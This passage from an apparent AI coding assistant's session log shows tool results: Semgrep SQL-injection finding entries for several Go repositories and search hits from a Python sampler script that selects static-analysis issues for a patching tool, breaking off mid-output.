\\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 31,\\n            \\"issue_object_hash\\": \\"c927321cb1cce7ad39af698943333971\\",\\n            \\"path_to_issue_object\\": \\"c927321cb1cce7ad39af698943333971.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"c927321cb1cce7ad39af698943333971.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 27,\\n            \\"issue_object_hash\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70\\",\\n            \\"path_to_issue_object\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 30,\\n            \\"issue_object_hash\\": \\"bdbe6ad4a26aef8ad97db6e66adad229\\",\\n            \\"path_to_issue_object\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 29,\\n            \\"issue_object_hash\\": \\"bdbe6ad4a26aef8ad97db6e66adad229\\",\\n            \\"path_to_issue_object\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 12,\\n            \\"issue_object_hash\\": \\"12e36579cafa09e786f12c4a257ca4e7\\",\\n            \\"path_to_issue_object\\": \\"12e36579cafa09e786f12c4a257ca4e7.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"12e36579cafa09e786f12c4a257ca4e7.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 28,\\n            \\"issue_object_hash\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70\\",\\n            \\"path_to_issue_object\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 5,\\n            \\"issue_object_hash\\": \\"bc90c5d567713c3a4b7f2aece525894e\\",\\n            \\"path_to_issue_object\\": \\"bc90c5d567713c3a4b7f2aece525894e.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bc90c5d567713c3a4b7f2aece525894e.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/ISDuBA/ISDuBA/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/ISDuBA/ISDuBA/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        }\\n    ]\\n}","numCharactersInRequestedRange":7367,"totalLinesInFile":145}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:02.049Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "codebase_search",
          "parameters": "{"repositoryInfo":{"relativeWorkspacePath":".","repoName":"7297bde4-6c3c-4b5f-9f31-a615fa663f72","repoOwner":"google-oauth2|user_01JMHPT9B3D4A66MBMWNRKH8QX","orthogonalTransformSeed":3253139624173949,"preferredEmbeddingModel":"EMBEDDING_MODEL_UNSPECIFIED"},"query":"samples directory patchino _samples","topK":15,"explanation":"","codeResults":[{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":240,"column":20},"endPosition":{"line":268,"column":18}},"signatures":{}},"score":0.3773112893104553},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":170,"column":38},"endPosition":{"line":231,"column":40}},"signatures":{}},"score":0.35427165031433105},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":430,"column":82},"endPosition":{"line":466,"column":19}},"signatures":{"ranges":[{"startPosition":{"line":402,"column":1},"endPosition":{"line":403,"column":5}}]}},"score":0.34733879566192627},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":399,"column":19},"endPosition":{"line":430,"column":82}},"signatures":{}},"score":0.3328891098499298},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/issue_processor.py","range":{"startPosition":{"line":227,"column":100},"endPosition":{"line":273,"column":52}},"signatures":{}},"score":0.3203110694885254},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":340,"column":10},"endPosition":{"line":374,"column":14}},"signatures":{}},"score":0.3197915554046631},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":41,"column":2}},"signatures":{}},"score":0.31523633003234863},{"codeBlock":{"relativeWorkspacePath":"patchino/tests/conftest.py","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":21,"column":56}},"signatures":{}},"score":0.3096945881843567},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":268,"column":18},"endPosition":{"line":316,"column":75}},"signatures":{}},"score":0.30686768889427185},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":316,"column":75},"endPosition":{"line":340,"column":10}},"signatures":{"ranges":[{"startPosition":{"line":271,"column":1},"endPosition":{"line":272,"column":5}}]}},"score":0.2911666929721832},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/backend/mutations/run_sampler.py","range":{"startPosition":{"line":71,"column":86},"endPosition":{"line":103,"column":27}},"signatures":{"ranges":[{"startPosition":{"line":18,"column":1},"endPosition":{"line":19,"column":1}},{"startPosition":{"line":19,"column":1},"endPosition":{"line":24,"column":5}}]}},"score":0.2901548147201538},{"codeBlock":{"relativeWorkspacePath":"services/node_general_backend/src/maintenance/try_now.ts","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":40,"column":5}},"signatures":{}},"score":0.2817254960536957},{"codeBlock":{"relativeWorkspacePath":"patchino/tests/conftest.py","range":{"startPosition":{"line":186,"column":28},"endPosition":{"line":208,"column":27}},"signatures":{}},"score":0.2698521614074707},{"codeBlock":{"relativeWorkspacePath":"pycommon/tests/conftest.py","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":42,"column":22}},"signatures":{}},"score":0.2692480683326721},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":374,"column":14},"endPosition":{"line":399,"column":19}},"signatures":{"ranges":[{"startPosition":{"line":343,"column":1},"endPosition":{"line":344,"column":5}}]}},"score":0.2687819004058838}]}",
          "rawArguments": "{"query": "samples directory patchino _samples", "target_directories": []}",
          "result": "{"codeResults":[{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":233},"endPosition":{"line":339}},"contents":"\\n\\n\\nasync def main(\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),\\n):\\n    with open(input_config_abs_path, \\"r\\") as f:\\n        input_config = SamplerConfig.from_json(f.read())\\n\\n    print(f\\"Sampler config: {input_config}\\")\\n    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")\\n\\n    samples = []\\n\\n    samples += await _get_customer_report_samples(input_config)\\n    samples += await _get_dataset_samples(input_config)\\n\\n    samples = samples[0 : input_config.max_sample_count]\\n\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\n\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\n        print(\\n            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"\\n        )\\n\\n    await _save_output(input_config, samples)\\n    print(\\"Done\\")","originalContents":"\\n\\n\\nasync def main(\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),\\n):\\n    with open(input_config_abs_path, \\"r\\") as f:\\n        input_config = SamplerConfig.from_json(f.read())\\n\\n    print(f\\"Sampler config: {input_config}\\")\\n    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")\\n\\n    samples = []\\n\\n    samples += await _get_customer_report_samples(input_config)\\n    samples += await _get_dataset_samples(input_config)\\n\\n    samples = samples[0 : input_config.max_sample_count]\\n\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\n\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\n        print(\\n            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"\\n        )\\n\\n    await _save_output(input_config, samples)\\n    print(\\"Done\\")","detailedLines":[{"text":"@dataclass","lineNumber":234},{"text":"class Sample:","lineNumber":235,"isSignature":true},{"lineNumber":237},{"text":"    report_path: str","lineNumber":238},{"text":"    source_archive_path: str","lineNumber":239},{"text":"    is_public: bool","lineNumber":240,"isSignature":true},{"lineNumber":241},{"lineNumber":242},{"text":"async def main(","lineNumber":243,"isSignature":true},{"text":"    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),","lineNumber":244,"isSignature":true},{"text":"):","lineNumber":245,"isSignature":true},{"text":"    with open(input_config_abs_path, \\"r\\") as f:","lineNumber":246},{"text":"        input_config = SamplerConfig.from_json(f.read())","lineNumber":247},{"lineNumber":248},{"text":"    print(f\\"Sampler config: {input_config}\\")","lineNumber":249},{"text":"    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")","lineNumber":250},{"lineNumber":251},{"text":"    samples = []","lineNumber":252},{"lineNumber":253},{"text":"    samples += await _get_customer_report_samples(input_config)","lineNumber":254},{"text":"    samples += await _get_dataset_samples(input_config)","lineNumber":255},{"lineNumber":256},{"text":"    samples = samples[0 : input_config.max_sample_count]","lineNumber":257},{"lineNumber":258},{"text":"    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])","lineNumber":259},{"lineNumber":260},{"text":"    if sast_issue_type_used != set(input_config.sast_issue_types):","lineNumber":261},{"text":"        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used","lineNumber":262},{"text":"        print(","lineNumber":263},{"text":"            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"","lineNumber":264},{"text":"        )","lineNumber":265},{"lineNumber":266},{"text":"    await _save_output(input_config, samples)","lineNumber":267},{"text":"    print(\\"Done\\")","lineNumber":268,"isSignature":true},{"lineNumber":269},{"lineNumber":270},{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"text":"    ","lineNumber":272}]},"score":0.3773112893104553},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":168,"column":33},"endPosition":{"line":239}},"contents":"\\n    \\"microsoft entity framework core\\": None,\\n    \\"microsoft extensions logger\\": None,\\n    \\"mybatis configuration\\": None,\\n    \\"objc\\": None,\\n    \\"objective-c core\\": None,\\n    \\"openapi configuration\\": None,\\n    \\"password secrets\\": None,\\n    \\"perl\\": None,\\n    \\"php\\": \\"php\\",\\n    \\"php configuration\\": \\"php\\",\\n    \\"php debug\\": \\"php\\",\\n    \\"plsql\\": None,\\n    \\"problem-based-packs\\": None,\\n    \\"py\\": \\"python\\",\\n    \\"python\\": \\"python\\",\\n    \\"python core\\": \\"python\\",\\n    \\"python core hashlib\\": \\"python\\",\\n    \\"python core os\\": \\"python\\",\\n    \\"python core random\\": \\"python\\",\\n    \\"python core shutil\\": \\"python\\",\\n    \\"python core sqlite3\\": \\"python\\",\\n    \\"python core subprocess\\": \\"python\\",\\n    \\"python lxml\\": \\"python\\",\\n    \\"python mysql\\": \\"python\\",\\n    \\"python mysqldb\\": \\"python\\",\\n    \\"ruby\\": None,\\n    \\"scala\\": None,\\n    \\"secrets\\": None,\\n    \\"sql core\\": None,\\n    \\"swift\\": None,\\n    \\"terraform\\": None,\\n    \\"text\\": None,\\n    \\"trailofbits\\": None,\\n    \\"trojan source\\": None,\\n    \\"ts\\": None,\\n    \\"typescript\\": None,\\n    \\"typescript angular\\": None,\\n    \\"vbnet\\": None,\\n    \\"web\\": None,\\n    \\"xml\\": \\"xml\\",\\n    \\"xml schema\\": \\"xml\\",\\n    \\"yaml\\": None,\\n    \\"yaml core\\": None,\\n    \\"\\": None,\\n}\\n\\n\\nclass SamplerConfig(BaseModel):\\n    sast_issue_types: Annotated[list[str], Len(min_length=1)]\\n    sast_issue_languages: Annotated[list[str], Len(min_length=1)]\\n    output_dir_path: str = str(SCRIPT_PATH / \\"../_samples\\")\\n    customer_report_path: Optional[str] = None\\n    customer_source_archive_path: Optional[str] = None\\n    customer_report_issue_indexes: Optional[list[int]] = None\\n    max_sample_count: int = 10\\n    is_from_docker: bool = False\\n\\n    @classmethod\\n    def from_json(cls, json_str: str) -> SamplerConfig:\\n        data = json.loads(json_str)\\n        return cls.model_validate(data)","originalContents":"\\n    \\"microsoft entity framework core\\": None,\\n    \\"microsoft extensions logger\\": None,\\n    \\"mybatis configuration\\": None,\\n    \\"objc\\": None,\\n    \\"objective-c core\\": None,\\n    \\"openapi configuration\\": None,\\n    \\"password secrets\\": None,\\n    \\"perl\\": None,\\n    \\"php\\": \\"php\\",\\n    \\"php configuration\\": \\"php\\",\\n    \\"php debug\\": \\"php\\",\\n    \\"plsql\\": None,\\n    \\"problem-based-packs\\": None,\\n    \\"py\\": \\"python\\",\\n    \\"python\\": \\"python\\",\\n    \\"python core\\": \\"python\\",\\n    \\"python core hashlib\\": \\"python\\",\\n    \\"python core os\\": \\"python\\",\\n    \\"python core random\\": \\"python\\",\\n    \\"python core shutil\\": \\"python\\",\\n    \\"python core sqlite3\\": \\"python\\",\\n    \\"python core subprocess\\": \\"python\\",\\n    \\"python lxml\\": \\"python\\",\\n    \\"python mysql\\": \\"python\\",\\n    \\"python mysqldb\\": \\"python\\",\\n    \\"ruby\\": None,\\n    \\"scala\\": None,\\n    \\"secrets\\": None,\\n    \\"sql core\\": None,\\n    \\"swift\\": None,\\n    \\"terraform\\": None,\\n    \\"text\\": None,\\n    \\"trailofbits\\": None,\\n    \\"trojan source\\": None,\\n    \\"ts\\": None,\\n    \\"typescript\\": None,\\n    \\"typescript angular\\": None,\\n    \\"vbnet\\": None,\\n    \\"web\\": None,\\n    \\"xml\\": \\"xml\\",\\n    \\"xml schema\\": \\"xml\\",\\n    \\"yaml\\": None,\\n    \\"yaml core\\": None,\\n    \\"\\": None,\\n}\\n\\n\\nclass SamplerConfig(BaseModel):\\n    sast_issue_types: Annotated[list[str], Len(min_length=1)]\\n    sast_issue_languages: Annotated[list[str], Len(min_length=1)]\\n    output_dir_path: str = str(SCRIPT_PATH / \\"../_samples\\")\\n    customer_report_path: Optional[str] = None\\n    customer_source_archive_path: Optional[str] = None\\n    customer_report_issue_indexes: Optional[list[int]] = None\\n    max_sample_count: int = 10\\n    is_from_docker: bool = False\\n\\n    @classmethod\\n    def from_json(cls, json_str: str) -> SamplerConfig:\\n        data = json.loads(json_str)\\n        return cls.model_validate(data)","detailedLines":[{"text":"    \\"microsoft aspnetcore mvc\\": None,","lineNumber":170},{"text":"    \\"microsoft entity framework core\\": None,","lineNumber":171},{"text":"    \\"microsoft extensions logger\\": None,","lineNumber":172},{"text":"    \\"mybatis configuration\\": None,","lineNumber":173},{"text":"    \\"objc\\": None,","lineNumber":174},{"text":"    \\"objective-c core\\": None,","lineNumber":175},{"text":"    \\"openapi configuration\\": None,","lineNumber":176},{"text":"    \\"password secrets\\": None,","lineNumber":177},{"text":"    \\"perl\\": None,","lineNumber":178},{"text":"    \\"php\\": \\"php\\",","lineNumber":179},{"text":"    \\"php configuration\\": \\"php\\",","lineNumber":180},{"text":"    \\"php debug\\": \\"php\\",","lineNumber":181},{"text":"    \\"plsql\\": None,","lineNumber":182},{"text":"    \\"problem-based-packs\\": None,","lineNumber":183},{"text":"    \\"py\\": \\"python\\",","lineNumber":184},{"text":"    \\"python\\": \\"python\\",","lineNumber":185},{"text":"    \\"python core\\": \\"python\\",","lineNumber":186},{"text":"    \\"python core hashlib\\": \\"python\\",","lineNumber":187},{"text":"    \\"python core os\\": \\"python\\",","lineNumber":188},{"text":"    \\"python core random\\": \\"python\\",","lineNumber":189},{"text":"    \\"python core shutil\\": \\"python\\",","lineNumber":190},{"text":"    \\"python core sqlite3\\": \\"python\\",","lineNumber":191},{"text":"    \\"python core subprocess\\": \\"python\\",","lineNumber":192},{"text":"    \\"python lxml\\": \\"python\\",","lineNumber":193},{"text":"    \\"python mysql\\": \\"python\\",","lineNumber":194},{"text":"    \\"python mysqldb\\": \\"python\\",","lineNumber":195},{"text":"    \\"ruby\\": None,","lineNumber":196},{"text":"    \\"scala\\": None,","lineNumber":197},{"text":"    \\"secrets\\": None,","lineNumber":198},{"text":"    \\"sql core\\": None,","lineNumber":199},{"text":"    \\"swift\\": None,","lineNumber":200},{"text":"    \\"terraform\\": None,","lineNumber":201},{"text":"    \\"text\\": None,","lineNumber":202},{"text":"    \\"trailofbits\\": None,","lineNumber":203},{"text":"    \\"trojan source\\": None,","lineNumber":204},{"text":"    \\"ts\\": None,","lineNumber":205},{"text":"    \\"typescript\\": None,","lineNumber":206},{"text":"    \\"typescript angular\\": None,","lineNumber":207},{"text":"    \\"vbnet\\": None,","lineNumber":208},{"text":"    \\"web\\": None,","lineNumber":209},{"text":"    \\"xml\\": \\"xml\\",","lineNumber":210},{"text":"    \\"xml schema\\": \\"xml\\",","lineNumber":211},{"text":"    \\"yaml\\": None,","lineNumber":212},{"text":"    \\"yaml core\\": None,","lineNumber":213},{"text":"    \\"\\": None,","lineNumber":214},{"text":"}","lineNumber":215},{"lineNumber":216},{"lineNumber":217},{"text":"class SamplerConfig(BaseModel):","lineNumber":218,"isSignature":true},{"text":"    sast_issue_types: Annotated[list[str], Len(min_length=1)]","lineNumber":219},{"text":"    sast_issue_languages: Annotated[list[str], Len(min_length=1)]","lineNumber":220},{"text":"    output_dir_path: str = str(SCRIPT_PATH / \\"../_samples\\")","lineNumber":221},{"text":"    customer_report_path: Optional[str] = None","lineNumber":222},{"text":"    customer_source_archive_path: Optional[str] = None","lineNumber":223},{"text":"    customer_report_issue_indexes: Optional[list[int]] = None","lineNumber":224},{"text":"    max_sample_count: int = 10","lineNumber":225},{"text":"    is_from_docker: bool = False","lineNumber":226},{"lineNumber":227},{"text":"    @classmethod","lineNumber":228},{"text":"    def from_json(cls, json_str: str) -> SamplerConfig:","lineNumber":229},{"text":"        data = json.loads(json_str)","lineNumber":230},{"text":"        return cls.model_validate(data)","lineNumber":231,"isSignature":true},{"lineNumber":232},{"lineNumber":233},{"text":"@dataclass","lineNumber":234},{"text":"class Sample:","lineNumber":235,"isSignature":true},{"text":"    issue: Issue","lineNumber":236},{"text":"    report: BaseReportStream","lineNumber":237}]},"score":0.35427165031433105},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":398,"column":18},"endPosition":{"line":497}},"contents":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\n\\n\\n    ...\\n\\n\\n    while len(samples) <= config.max_sample_count and len(repo_to_issue_indexes) > 0:\\n        sast_report_summary_path = random.choice(list(repo_to_issue_indexes.keys()))\\n        issue_indexes = repo_to_issue_indexes[sast_report_summary_path]\\n        issue_index = random.choice(issue_indexes)\\n\\n        sast_report_path = sast_report_summary_path.absolute().with_suffix(\\"\\")\\n        source_code_zip_path = sast_report_summary_path.absolute().parent / \\"repo.zip\\"\\n\\n        issues, report = await _get_report_issues(\\n            sast_report_path,\\n            source_code_zip_path,\\n        )\\n        issue = issues[issue_index]\\n\\n        if issue.fingerprint_hash:\\n            samples.append(\\n                Sample(\\n                    issue=issues[issue_index],\\n                    report=report,\\n                    report_path=sast_report_path,\\n                    source_archive_path=source_code_zip_path,\\n                    is_public=True,\\n                )\\n            )\\n        else:\\n            print(\\n                f\\"Skipping issue {issue.index} because cannot calculate fingerprint hash {str(sast_report_path)}\\"\\n            )\\n\\n        repo_to_issue_indexes[sast_report_summary_path].remove(issue_index)\\n\\n        if len(repo_to_issue_indexes[sast_report_summary_path]) == 0:\\n            del repo_to_issue_indexes[sast_report_summary_path]\\n\\n    return samples","originalContents":"\\n\\n    while len(samples) <= config.max_sample_count and len(repo_to_issue_indexes) > 0:\\n        sast_report_summary_path = random.choice(list(repo_to_issue_indexes.keys()))\\n        issue_indexes = repo_to_issue_indexes[sast_report_summary_path]\\n        issue_index = random.choice(issue_indexes)\\n\\n        sast_report_path = sast_report_summary_path.absolute().with_suffix(\\"\\")\\n        source_code_zip_path = sast_report_summary_path.absolute().parent / \\"repo.zip\\"\\n\\n        issues, report = await _get_report_issues(\\n            sast_report_path,\\n            source_code_zip_path,\\n        )\\n        issue = issues[issue_index]\\n\\n        if issue.fingerprint_hash:\\n            samples.append(\\n                Sample(\\n                    issue=issues[issue_index],\\n                    report=report,\\n                    report_path=sast_report_path,\\n                    source_archive_path=source_code_zip_path,\\n                    is_public=True,\\n                )\\n            )\\n        else:\\n            print(\\n                f\\"Skipping issue {issue.index} because cannot calculate fingerprint hash {str(sast_report_path)}\\"\\n            )\\n\\n        repo_to_issue_indexes[sast_report_summary_path].remove(issue_index)\\n\\n        if len(repo_to_issue_indexes[sast_report_summary_path]) == 0:\\n            del repo_to_issue_indexes[sast_report_summary_path]\\n\\n    return samples","detailedLines":[{"text":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":402,"isSignature":true},{"text":"    samples = []","lineNumber":403},{"text":"(indexes)","lineNumber":428},{"lineNumber":429},{"text":"    print(f\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\")","lineNumber":430},{"lineNumber":431},{"text":"    while len(samples) <= config.max_sample_count and len(repo_to_issue_indexes) > 0:","lineNumber":432},{"text":"        sast_report_summary_path = random.choice(list(repo_to_issue_indexes.keys()))","lineNumber":433},{"text":"        issue_indexes = repo_to_issue_indexes[sast_report_summary_path]","lineNumber":434},{"text":"        issue_index = random.choice(issue_indexes)","lineNumber":435},{"lineNumber":436},{"text":"        sast_report_path = sast_report_summary_path.absolute().with_suffix(\\"\\")","lineNumber":437},{"text":"        source_code_zip_path = sast_report_summary_path.absolute().parent / \\"repo.zip\\"","lineNumber":438},{"lineNumber":439},{"text":"        issues, report = await _get_report_issues(","lineNumber":440},{"text":"            sast_report_path,","lineNumber":441},{"text":"            source_code_zip_path,","lineNumber":442},{"text":"        )","lineNumber":443},{"text":"        issue = issues[issue_index]","lineNumber":444},{"lineNumber":445},{"text":"        if issue.fingerprint_hash:","lineNumber":446},{"text":"            samples.append(","lineNumber":447},{"text":"                Sample(","lineNumber":448},{"text":"                    issue=issues[issue_index],","lineNumber":449},{"text":"                    report=report,","lineNumber":450},{"text":"                    report_path=sast_report_path,","lineNumber":451},{"text":"                    source_archive_path=source_code_zip_path,","lineNumber":452},{"text":"                    is_public=True,","lineNumber":453},{"text":"                )","lineNumber":454},{"text":"            )","lineNumber":455},{"text":"        else:","lineNumber":456},{"text":"            print(","lineNumber":457},{"text":"                f\\"Skipping issue {issue.index} because cannot calculate fingerprint hash {str(sast_report_path)}\\"","lineNumber":458},{"text":"            )","lineNumber":459},{"lineNumber":460},{"text":"        repo_to_issue_indexes[sast_report_summary_path].remove(issue_index)","lineNumber":461},{"lineNumber":462},{"text":"        if len(repo_to_issue_indexes[sast_report_summary_path]) == 0:","lineNumber":463},{"text":"            del repo_to_issue_indexes[sast_report_summary_path]","lineNumber":464},{"lineNumber":465},{"text":"    return samples","lineNumber":466,"isSignature":true},{"lineNumber":467},{"lineNumber":468},{"text":"@locked_alru_cache","lineNumber":469},{"text":"async def _get_report_issues(","lineNumber":470,"isSignature":true},{"text":"    sast_report_path: pathlib.Path, source_code_zip_path: pathlib.Path","lineNumber":471,"isSignature":true},{"text":") -> tuple[list[Issue], BaseReportStream]:","lineNumber":472,"isSignature":true},{"text":"    ","lineNumber":473}]},"score":0.34733879566192627},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":342},"endPosition":{"line":465}},"contents":"\\n\\n\\nasync def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\n    samples = []\\n    repo_to_issue_indexes = defaultdict(list)\\n    for sast_report_summary_path in DATASET_DATA_FOLDER_PATH.rglob(\\"**/*.json\\"):\\n        with open(sast_report_summary_path, \\"r\\") as f:\\n            data = json.load(f)\\n\\n        # create a set of reports, and a dicionary from report to issue list indexes\\n        for language, dict_severity_to_type in data.items():\\n            if (\\n                language_mapping.get(language.lower(), \\"\\")\\n                not in config.sast_issue_languages\\n                and language not in config.sast_issue_languages\\n            ):\\n                continue\\n\\n            for severity, issue_type_to_issue_data in dict_severity_to_type.items():\\n                for issue_type, issue_data in issue_type_to_issue_data.items():\\n                    if issue_type not in config.sast_issue_types:\\n                        continue\\n\\n                    indexes = issue_data[\\"indexes\\"]\\n\\n                    if len(indexes) == 0:\\n                        continue\\n\\n                    repo_to_issue_indexes[sast_report_summary_path].extend(indexes)\\n\\n    print(f\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\")","originalContents":"\\n\\n\\nasync def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\n    samples = []\\n    repo_to_issue_indexes = defaultdict(list)\\n    for sast_report_summary_path in DATASET_DATA_FOLDER_PATH.rglob(\\"**/*.json\\"):\\n        with open(sast_report_summary_path, \\"r\\") as f:\\n            data = json.load(f)\\n\\n        # create a set of reports, and a dicionary from report to issue list indexes\\n        for language, dict_severity_to_type in data.items():\\n            if (\\n                language_mapping.get(language.lower(), \\"\\")\\n                not in config.sast_issue_languages\\n                and language not in config.sast_issue_languages\\n            ):\\n                continue\\n\\n            for severity, issue_type_to_issue_data in dict_severity_to_type.items():\\n                for issue_type, issue_data in issue_type_to_issue_data.items():\\n                    if issue_type not in config.sast_issue_types:\\n                        continue\\n\\n                    indexes = issue_data[\\"indexes\\"]\\n\\n                    if len(indexes) == 0:\\n                        continue\\n\\n                    repo_to_issue_indexes[sast_report_summary_path].extend(indexes)\\n\\n    print(f\\"Found {len(repo_to_issue_indexes)} dataset 